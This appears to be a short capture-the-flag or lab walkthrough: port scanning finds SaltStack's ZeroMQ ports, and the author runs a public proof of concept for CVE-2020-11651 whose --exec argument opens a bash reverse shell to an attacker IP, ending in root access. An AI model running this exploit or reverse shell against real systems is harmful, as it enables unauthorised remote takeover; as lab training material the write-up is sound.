nmap shows ports 22, 80, 8000 open. deep nmap shows ports 4505 and 4506 open
Enum on 80 and 8000 doesnt give much
nmap reveals 4505 and 4506 are "ZeroMQ zmtp 2.0"
Nothing on searchsploit
But a quick google search for "ZeroMQ zmtp 2.0 exploit" leads us to
https://www.exploit-db.com/exploits/48421 and then to his github repo
```txt
https://github.com/jasperla/CVE-2020-11651-poc
```
Install salt module and all the dependencies
Then run the exploit
`/opt/venv1/bin/python3 exploit.py --master 192.168.131.62 --exec "bash -i >& /dev/tcp/192.168.45.221/4505 0>&1"`
root!